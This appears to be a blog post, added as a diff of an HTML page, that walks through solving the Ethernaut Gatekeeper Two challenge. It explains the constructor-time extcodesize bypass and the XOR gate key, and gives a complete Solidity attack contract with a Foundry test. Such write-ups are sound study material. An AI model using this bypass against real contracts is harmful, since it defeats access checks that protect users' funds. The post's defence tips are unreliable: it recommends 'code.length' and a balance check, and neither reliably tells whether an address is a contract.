@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Etnhernault Level 14: Gatekeeper Two - 合约创建时的 extcodesize - Kent&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>KENT&#39;S BLOG</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
+<li><a href="/">首页</a></li>
+<li><a href="/archives">文章归档</a></li>
+<li><a href="/categories">分类浏览</a> </li>
+<li><a href="/tags">标签云</a></li>
+</ul>
+<h2 id="⛽-Gas-优化大师"><a href="#⛽-Gas-优化大师" class="headerlink" title="⛽ Gas 优化大师"></a>⛽ Gas 优化大师</h2><ul>
+<li><a href="/2025/09/12/gas-optimization-master-course/">Gas Optimization Master Course</a></li>
+</ul>
+<h2 id="🔗-Reth-公链开发"><a href="#🔗-Reth-公链开发" class="headerlink" title="🔗 Reth 公链开发"></a>🔗 Reth 公链开发</h2><ul>
+<li><a href="/categories/Reth%E5%BC%80%E5%8F%91">Reth 架构深度解析</a></li>
+<li><a href="/tags/Rust%E5%8C%BA%E5%9D%97%E9%93%BE">Rust + Ethereum 开发指南</a></li>
+<li><a href="/tags/%E6%89%A7%E8%A1%8C%E5%B1%82">自定义执行层实现</a></li>
+<li><a href="/tags/Layer2">Layer2 解决方案开发</a></li>
+</ul>
+<h2 id="🎯-MEV-前沿研究"><a href="#🎯-MEV-前沿研究" class="headerlink" title="🎯 MEV 前沿研究"></a>🎯 MEV 前沿研究</h2><ul>
+<li><a href="/categories/MEV%E7%A0%94%E7%A9%B6">MEV 基础概念</a></li>
+<li><a href="/tags/%E5%A5%97%E5%88%A9">套利策略分析</a></li>
+<li><a href="/tags/%E5%8C%BA%E5%9D%97%E6%9E%84%E5%BB%BA">区块构建优化</a></li>
+<li><a href="/tags/MEV%E6%9C%BA%E5%99%A8%E4%BA%BA">MEV Bot 开发实战</a></li>
+<li><a href="/tags/%E9%97%AA%E7%94%B5%E8%B4%B7">闪电贷套利策略</a></li>
+</ul>
+<h2 id="⚡-高性能区块链"><a href="#⚡-高性能区块链" class="headerlink" title="⚡ 高性能区块链"></a>⚡ 高性能区块链</h2><ul>
+<li><a href="/categories/%E5%B9%B6%E8%A1%8C%E6%89%A7%E8%A1%8C">并行执行引擎</a></li>
+</ul>
+<h2 id="Web3-0-专区"><a href="#Web3-0-专区" class="headerlink" title="Web3.0 专区"></a>Web3.0 专区</h2><ul>
+<li><a href="/categories/Dapp">Dapp 开发</a></li>
+<li><a href="/tags/solidity">智能合约</a></li>
+<li><a href="/tags/blockchain">区块链技术</a></li>
+<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3安全</a></li>
+</ul>
+<h2 id="Ethernaut-Foundry-系列-🛡️"><a href="#Ethernaut-Foundry-系列-🛡️" class="headerlink" title="Ethernaut&amp;Foundry 系列 🛡️"></a>Ethernaut&amp;Foundry 系列 🛡️</h2><ul>
+<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列总览</a></li>
+<li><a href="/2025/01/25/foundry-setup-guide/">Foundry 环境搭建</a></li>
+<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
+<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
+<li><a href="/2025/01/25/ethernaut-level-03-coinflip/">Level 3: Coin Flip</a></li>
+<li><a href="/2025/01/25/ethernaut-level-04-telephone/">Level 4: Telephone</a></li>
+<li><a href="/2025/01/25/ethernaut-level-05-token/">Level 5: Token</a></li>
+<li><a href="/2025/01/25/ethernaut-level-06-delegation/">Level 6: Delegation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-07-force/">Level 7: Force</a></li>
+<li><a href="/2025/01/25/ethernaut-level-08-vault/">Level 8: Vault</a></li>
+<li><a href="/2025/01/25/ethernaut-level-09-king/">Level 9: King</a></li>
+<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
+<li><a href="/2025/01/25/ethernaut-level-11-elevator/">Level 11: Elevator</a></li>
+<li><a href="/2025/01/25/ethernaut-level-12-privacy/">Level 12: Privacy</a></li>
+<li><a href="/2025/01/25/ethernaut-level-13-gatekeeper-one/">Level 13: Gatekeeper One</a></li>
+<li><a href="/2025/01/25/ethernaut-level-14-gatekeeper-two/">Level 14: Gatekeeper Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-15-naught-coin/">Level 15: Naught Coin</a></li>
+<li><a href="/2025/01/25/ethernaut-level-16-preservation/">Level 16: Preservation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-17-recovery/">Level 17: Recovery</a></li>
+<li><a href="/2025/01/25/ethernaut-level-18-magic-number/">Level 18: Magic Number</a></li>
+<li><a href="/2025/01/25/ethernaut-level-19-alien-codex/">Level 19: Alien Codex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-20-denial/">Level 20: Denial</a></li>
+<li><a href="/2025/01/25/ethernaut-level-21-shop/">Level 21: Shop</a></li>
+<li><a href="/2025/01/25/ethernaut-level-22-dex/">Level 22: Dex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-23-dex-two/">Level 23: Dex Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-24-puzzle-wallet/">Level 24: Puzzle Wallet</a></li>
+<li><a href="/2025/01/25/ethernaut-level-25-motorbike/">Level 25: Motorbike</a></li>
+</ul>
+<h2 id="个人页面"><a href="#个人页面" class="headerlink" title="个人页面"></a>个人页面</h2><ul>
+<li><a href="/about">关于我</a></li>
+<li><a href="/repository">项目展示</a></li>
+<li><a href="/books">书单推荐</a></li>
+<li><a href="/links">友情链接</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="🎯-Ethernaut-Level-14-Gatekeeper-Two-合约创建时的-extcodesize"><a href="#🎯-Ethernaut-Level-14-Gatekeeper-Two-合约创建时的-extcodesize" class="headerlink" title="🎯 Ethernaut Level 14: Gatekeeper Two - 合约创建时的 extcodesize"></a>🎯 Ethernaut Level 14: Gatekeeper Two - 合约创建时的 extcodesize</h1><blockquote>
+<p><strong>关卡链接</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/14">Ethernaut Level 14 - Gatekeeper Two</a><br><strong>攻击类型</strong>: <code>extcodesize</code> &#x2F; <code>constructor</code> 交互<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>
+</blockquote>
+<h2 id="📋-挑战目标"><a href="#📋-挑战目标" class="headerlink" title="📋 挑战目标"></a>📋 挑战目标</h2><p>与上一关类似，我们需要再次通过三个 <code>modifier</code> 的检查，成为 <code>entrant</code>。</p>
+<p><img src="https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg" alt="Gatekeeper Two Requirements"></p>
+<h2 id="🔍-漏洞分析"><a href="#🔍-漏洞分析" class="headerlink" title="🔍 漏洞分析"></a>🔍 漏洞分析</h2><p>要通过此关卡，我们需要调用 <code>enter(bytes8 _gateKey)</code> 函数，并绕过它的三个 <code>modifier</code>。</p>
+<h3 id="Modifier-1-gateOne"><a href="#Modifier-1-gateOne" class="headerlink" title="Modifier 1: gateOne"></a>Modifier 1: <code>gateOne</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier gateOne() &#123;</span><br><span class="line">  require(msg.sender != tx.origin);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>与第13关完全相同。我们需要通过一个中间合约来调用 <code>enter</code> 函数，以确保 <code>msg.sender</code> 是合约地址，而 <code>tx.origin</code> 是我们的EOA地址。</p>
+<h3 id="Modifier-2-gateTwo"><a href="#Modifier-2-gateTwo" class="headerlink" title="Modifier 2: gateTwo"></a>Modifier 2: <code>gateTwo</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">modifier gateTwo() &#123;</span><br><span class="line">  uint x;</span><br><span class="line">  assembly &#123;</span><br><span class="line">    x := extcodesize(caller())</span><br><span class="line">  &#125;</span><br><span class="line">  require(x == 0);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>modifier</code> 使用内联汇编检查 <code>caller()</code> 的 <code>extcodesize</code> 是否为0。<code>caller()</code> 返回的是直接调用者的地址（在我们的场景中，就是攻击合约的地址），而 <code>extcodesize</code> 返回该地址关联的代码大小。</p>
+<ul>
+<li>如果调用者是一个已经部署的合约，<code>extcodesize</code> 会返回一个大于0的值。</li>
+<li>如果调用者是一个外部账户（EOA），<code>extcodesize</code> 返回0。</li>
+</ul>
+<p>这与 <code>gateOne</code> 的要求（<code>msg.sender</code> 必须是合约）产生了矛盾。我们如何才能让一个合约地址的 <code>extcodesize</code> 为0呢？</p>
+<p>答案在于合约的创建过程：<strong>当一个合约的 <code>constructor</code> 正在执行时，该合约的代码尚未完全部署到链上，因此此时对该合约地址调用 <code>extcodesize</code> 会返回0。</strong></p>
+<p>因此，我们必须在攻击合约的 <code>constructor</code> 内部调用目标合约的 <code>enter</code> 函数。</p>
+<h3 id="Modifier-3-gateThree"><a href="#Modifier-3-gateThree" class="headerlink" title="Modifier 3: gateThree"></a>Modifier 3: <code>gateThree</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">  _;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>modifier</code> 包含一个有趣的异或（XOR）逻辑。让我们简化一下：</p>
+<p><code>A ^ B = C</code></p>
+<p>其中：</p>
+<ul>
+<li><code>A</code> 是 <code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code></li>
+<li><code>B</code> 是 <code>uint64(_gateKey)</code></li>
+<li><code>C</code> 是 <code>type(uint64).max</code> (即 <code>0xFFFFFFFFFFFFFFFF</code>)</li>
+</ul>
+<p>根据异或运算的性质，如果 <code>A ^ B = C</code>，那么 <code>A ^ C = B</code>。</p>
+<p>因此，我们可以通过计算 <code>A ^ C</code> 来得到我们需要的 <code>_gateKey</code>。</p>
+<p><code>_gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max</code></p>
+<p>由于 <code>msg.sender</code> 是我们的攻击合约地址，我们可以在攻击合约的 <code>constructor</code> 中计算出这个值。</p>
+<h2 id="💻-Foundry-实现"><a href="#💻-Foundry-实现" class="headerlink" title="💻 Foundry 实现"></a>💻 Foundry 实现</h2><h3 id="攻击合约代码"><a href="#攻击合约代码" class="headerlink" title="攻击合约代码"></a>攻击合约代码</h3><p>我们的攻击合约非常简洁。它在 <code>constructor</code> 中完成所有的工作：计算 <code>gateKey</code> 并立即调用目标实例的 <code>enter</code> 函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: Unlicense</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;src/14_GatekeeperTwo.sol&quot;;</span><br><span class="line"></span><br><span class="line">// Foundry 测试合约</span><br><span class="line">contract GatekeeperTwoTest is Test &#123;</span><br><span class="line">    GatekeeperTwo instance;</span><br><span class="line">    Attack attacker;</span><br><span class="line">    address player1;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        player1 = vm.addr(1);</span><br><span class="line">        instance = new GatekeeperTwo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttacker() public &#123;</span><br><span class="line">        vm.startPrank(player1, player1);</span><br><span class="line">        // 部署攻击合约时，其构造函数会自动执行攻击</span><br><span class="line">        attacker = new Attack(address(instance));</span><br><span class="line">        // 验证攻击是否成功</span><br><span class="line">        assertEq(instance.entrant(), player1);</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 攻击合约</span><br><span class="line">contract Attack &#123;</span><br><span class="line">    constructor(address _instanceAddress) &#123;</span><br><span class="line">        GatekeeperTwo instance = GatekeeperTwo(_instanceAddress);</span><br><span class="line"></span><br><span class="line">        // 计算 gateKey</span><br><span class="line">        // A ^ C = B</span><br><span class="line">        uint64 keyPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));</span><br><span class="line">        uint64 max_uint = type(uint64).max; // 0xFFFFFFFFFFFFFFFF</span><br><span class="line">        bytes8 gateKey = bytes8(keyPart ^ max_uint);</span><br><span class="line"></span><br><span class="line">        // 在构造函数中调用 enter 函数</span><br><span class="line">        instance.enter(gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="关键攻击步骤"><a href="#关键攻击步骤" class="headerlink" title="关键攻击步骤"></a>关键攻击步骤</h3><ol>
+<li><strong>创建攻击合约</strong>: 攻击逻辑完全包含在 <code>constructor</code> 中。</li>
+<li><strong>在 <code>constructor</code> 中调用</strong>: 这是关键。在 <code>constructor</code> 中调用 <code>enter</code> 函数，此时 <code>extcodesize(address(this))</code> 为0，绕过了 <code>gateTwo</code>。</li>
+<li><strong>计算 <code>_gateKey</code></strong>: 在 <code>constructor</code> 中，使用 <code>address(this)</code> 作为 <code>msg.sender</code> 来计算 <code>keccak256</code> 哈希，并通过XOR运算得到正确的 <code>_gateKey</code>，从而绕过 <code>gateThree</code>。</li>
+<li><strong>部署即攻击</strong>: 部署攻击合约的交易一旦成功，攻击就完成了，<code>entrant</code> 将被设置为我们的EOA地址。</li>
+</ol>
+<h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><ol>
+<li><strong>避免使用 <code>extcodesize</code> 进行合约检查</strong>: 正如本例所示，<code>extcodesize</code> 可以被 <code>constructor</code> 调用绕过。一个更可靠的检查方法是判断 <code>address.balance &gt; 0</code> 或者 <code>address.code.length &gt; 0</code>（在Solidity 0.8.10及更高版本中）。</li>
+<li><strong>对 <code>caller</code> 的额外检查</strong>: 如果确实需要阻止合约调用，可以结合 <code>tx.origin == msg.sender</code> 的检查，但这会限制合约的可组合性。</li>
+<li><strong>简化密钥验证</strong>: 复杂的密钥派生逻辑（如本例中的XOR）可能看起来安全，但如果所有输入都来自链上，攻击者通常可以逆向工程出正确的密钥。应使用链下签名等更安全的机制。</li>
+</ol>
+<h2 id="🔧-相关工具和技术"><a href="#🔧-相关工具和技术" class="headerlink" title="🔧 相关工具和技术"></a>🔧 相关工具和技术</h2><ul>
+<li><strong><code>constructor</code></strong>: 合约的构造函数，仅在合约部署时执行一次。理解其在生命周期中的特殊性（如 <code>extcodesize</code> 为0）是解决此类挑战的关键。</li>
+<li><strong><code>extcodesize</code></strong>: 一个EVM操作码，用于获取地址的代码大小。是区分EOA和合约的常用方法，但有其局限性。</li>
+<li><strong>异或运算 (<code>^</code>)</strong>: 一种位运算符，在密码学和哈希操作中很常见。理解其 <code>A ^ B = C</code> &lt;&#x3D;&gt; <code>A ^ C = B</code> 的性质对于解决 <code>gateThree</code> 至关重要。</li>
+</ul>
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>
+<ul>
+<li>合约在 <code>constructor</code> 执行期间的代码大小（<code>extcodesize</code>）为0。</li>
+<li><code>caller()</code> 和 <code>address(this)</code> 在特定上下文中的区别和联系。</li>
+<li>异或（XOR）运算的可逆性是解决密码学相关谜题的常用工具。</li>
+</ul>
+<p><strong>攻击向量</strong>:</p>
+<ul>
+<li>利用 <code>constructor</code> 的特性绕过 <code>extcodesize</code> 检查。</li>
+<li>在 <code>constructor</code> 中完成所有攻击步骤，实现“部署即攻击”。</li>
+<li>逆向工程XOR逻辑以计算出所需的密钥。</li>
+</ul>
+<p><strong>防御策略</strong>:</p>
+<ul>
+<li>不要依赖 <code>extcodesize</code> 来判断一个地址是否为合约。</li>
+<li>设计更简单、更直接的验证机制，避免模糊的链上密钥派生。</li>
+</ul>
+<h2 id="📚-参考资料"><a href="#📚-参考资料" class="headerlink" title="📚 参考资料"></a>📚 参考资料</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/latest/security-considerations.html#extcodesize-and-contracts-in-construction">Solidity Docs: <code>extcodesize</code> Caveats</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.evm.codes/">Understanding the EVM: Opcodes</a></li>
+</ul>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="K"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>Kent</div>
+      <div>2025-01-25</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/Ethernaut-%E7%B3%BB%E5%88%97/">Ethernaut 系列</a> <a class="category-link" href="/categories/Ethernaut-%E7%B3%BB%E5%88%97/%E8%BF%9B%E9%98%B6%E6%94%BB%E5%87%BB%E7%AF%87-11-20/">进阶攻击篇 (11-20)</a>
+
+      <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/constructor/" rel="tag">#constructor</a> <a class="tag-none-link" href="/tags/extcodesize/" rel="tag">#extcodesize</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#智能合约安全</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
